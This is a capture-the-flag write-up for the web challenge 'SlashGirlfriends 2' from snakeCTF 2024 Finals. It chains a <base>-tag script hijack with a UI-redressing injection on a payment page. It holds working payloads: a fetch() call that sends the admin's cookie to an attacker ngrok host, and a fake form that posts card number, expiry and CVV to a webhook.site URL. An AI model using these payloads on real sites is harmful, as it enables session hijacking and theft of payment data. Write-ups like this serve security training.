# SlashGirlfriends 2 [_snakeCTF 2024 Finals_]

**Category**: Web
**Author**: macedonga

## Description
Some people just couldn't get enough of SlashGirlfriends, that's why we're back for round 2.
Word is, the site's admins didn't learn their lesson from last time and left a few doors open...
This time, the secrets are bigger, juicier, and might even cost a little to uncover.
    
Can you charm your way past their defenses and steal the flag from someone?

## Solution

### Vulnerability 1: Arbitrary JavaScript execution on profile pages

The first vulnerability exists within the "about me" section of the public user profiles. This section permits markdown and specific HTML tags, including the `<base>` tag, which sets the base URL for all relative URLs in the page.

At the end of the profile page, a `console.js` script is loaded via a relative URL. By altering the base URL to point to an external server, the script's source can be controlled, enabling the execution of arbitrary JavaScript code.

The following payload can be added to the "about me" section to exploit this vulnerability:

```html
# my about me

<base href=http://your-ngrok-tunnel.ngrok.io>
```

After setting the base URL, the script will be loaded from our server, which enables arbitrary javascript execution. The following payload can be used to steal the admin's authentication cookie:

```js
fetch("http://your-ngrok-tunnel.ngrok.io/steal?cookie=" + btoa(document.cookie));
```

To trigger this, the profile can be reported from another account, prompting the administrator to view it. Upon visiting the profile, the admin's authentication cookie is exfiltrated, allowing login as the administrator.

### Vulnerability 2: UI redressing in the payment processor service

When purchasing a premium plan, users are redirected to a payment processor service. This page contains two disabled input fields displaying the user's username and email. Attempting to set a username such as `">` reveals that the input is not sanitised. This input can be exploited for a UI redressing attack.

While direct JavaScript injection is restricted by the Content Security Policy (CSP) header (`script-src 'self'`), the legitimate payment form can be hidden, and a fake form can be displayed instead. The following payload achieves this:

```html
"> </form>
<style>form:not(.show){"{display:none}"}</style>
<form class="show" action="http://webhook.site/your-uuid">
    <input name="pan">
    <input name="exp">
    <input name="cvv">
    <input name="notes">
</form><!--
```

When the fake form is submitted, the payment data, including the notes field containing the flag, is sent to the attacker's server.

### Combining the vulnerabilities to steal the flag

To combine these vulnerabilities, the following steps are performed:

- After obtaining the admin's authentication cookie using the profile page vulnerability, it is possible to search for the page from which the admin monitors the chats, as hinted by the initial message on them. The admin panel can be accessed via the `/admin` route, which can be found in the `_buildManifest.js` file.
- The admin panel allows viewing and sending messages on behalf of user-created girlfriends. From this page, it is observed that user `marco` frequently messages the girlfriend `lilvirgola`.
- A crafted message from `lilvirgola` containing a link to the doctored payment page can be sent to `marco`. (As `marco`'s "about me" says: "I trust her with all my heart, and I'd click ***any*** link she gives me!")
- When `marco` submits the fake payment form, the flag is included in the `notes` field and transmitted to the attacker's server.
